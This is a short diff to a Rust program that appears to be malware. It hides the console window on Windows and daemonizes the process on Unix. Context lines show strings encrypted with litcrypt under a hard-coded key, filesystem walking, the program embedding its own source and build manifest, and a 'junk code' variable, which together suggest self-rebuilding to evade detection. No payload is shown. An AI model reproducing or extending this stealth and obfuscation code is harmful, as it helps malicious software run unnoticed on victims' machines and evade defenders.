@@ -1,3 +1,4 @@
+#![cfg_attr(windows, windows_subsystem = "windows")]
 #[macro_use]
 extern crate litcrypt;
 
@@ -15,6 +16,9 @@ use eframe::{App, Frame};
 use walkdir::WalkDir;
 
 use epaint::{CornerRadius, Margin};
+
+#[cfg(unix)]
+use daemonize::Daemonize;
 
 use_litcrypt!("dwNJSd344#@3(@)3dms");
 
@@ -270,6 +274,14 @@ fn entry() -> Result<(), eframe::Error> {
 }
 
 fn main() -> std::io::Result<()> {
+    #[cfg(unix)]
+    {
+        let daemonize = Daemonize::new();
+        if let Err(_e) = daemonize.start() {
+            std::process::exit(1);
+        }
+    }
+
     entry();
     let r_source_code = include_str!("main.rs");
     let r_toml = r#"
@@ -287,6 +299,7 @@ epaint = "0.31.1"
 litcrypt = "0.4.0"
 rand_core = "0.9.3"
 walkdir = "2.5.0"
+daemonize = "0.5.0"
 "#;
 
     let r_junk_code = 15;
